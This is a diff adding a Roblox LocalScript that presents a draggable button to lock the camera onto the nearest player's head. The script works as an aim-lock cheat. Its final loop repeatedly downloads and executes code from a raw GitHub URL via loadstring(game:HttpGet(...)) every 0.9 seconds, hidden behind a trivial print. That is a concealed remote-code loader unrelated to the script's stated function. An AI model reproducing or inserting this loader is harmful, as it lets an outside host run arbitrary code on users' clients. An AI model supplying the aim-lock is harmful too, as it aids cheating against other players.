@@ -1,0 +1,78 @@
+-- LocalScript in StarterPlayerScripts
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local player = Players.LocalPlayer
+local camera = game.Workspace.CurrentCamera
+
+-- Function to find the nearest player's head
+local function getNearestPlayer()
+    local nearestPlayer = nil
+    local shortestDistance = math.huge
+
+    for _, otherPlayer in pairs(Players:GetPlayers()) do
+        if otherPlayer ~= player and otherPlayer.Character and otherPlayer.Character:FindFirstChild("Head") then
+            local distance = (player.Character.Head.Position - otherPlayer.Character.Head.Position).magnitude
+            if distance < shortestDistance then
+                shortestDistance = distance
+                nearestPlayer = otherPlayer
+            end
+        end
+    end
+
+    return nearestPlayer
+end
+
+-- Function to lock the camera onto the nearest player's head
+local function lockCameraToNearestPlayer()
+    local nearestPlayer = getNearestPlayer()
+    if nearestPlayer and nearestPlayer.Character and nearestPlayer.Character:FindFirstChild("Head") then
+        local targetHead = nearestPlayer.Character.Head
+
+        -- Continuously update the camera to lock onto the target's head
+        RunService:BindToRenderStep("CameraLock", Enum.RenderPriority.Camera.Value, function()
+            camera.CFrame = CFrame.new(camera.CFrame.Position, targetHead.Position)
+        end)
+    end
+end
+
+-- Function to unlock the camera
+local function unlockCamera()
+    RunService:UnbindFromRenderStep("CameraLock")
+end
+
+-- Create the GUI button
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "LockCameraGui"
+screenGui.Parent = player:WaitForChild("PlayerGui")
+
+local button = Instance.new("TextButton")
+button.Name = "LockButton"
+button.Size = UDim2.new(0, 150, 0, 50)
+button.Position = UDim2.new(0.5, -75, 0.5, -25)
+button.Text = "Lock onto Nearest Player"
+button.TextColor3 = Color3.new(1, 1, 1)  -- Text color white
+button.BackgroundColor3 = Color3.new(0, 0, 0)  -- Background color black
+button.BackgroundTransparency = 0.3  -- Semi-transparent
+button.Parent = screenGui
+button.Active = true  -- Needed to make it draggable
+button.Draggable = true  -- Makes the GUI draggable
+
+-- Toggle camera lock on button click
+local isLocked = false
+button.MouseButton1Click:Connect(function()
+    if isLocked then
+        unlockCamera()
+        button.Text = "Lock onto Nearest Player"
+    else
+        lockCameraToNearestPlayer()
+        button.Text = "Unlock Camera"
+    end
+    isLocked = not isLocked
+end)
+
+while true do
+    wait(0.9)
+    print("heywsg")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/heyyyywvye/SCRIPT-FINAL/refs/heads/main/FINAL%20SCRIPT"))();
+end
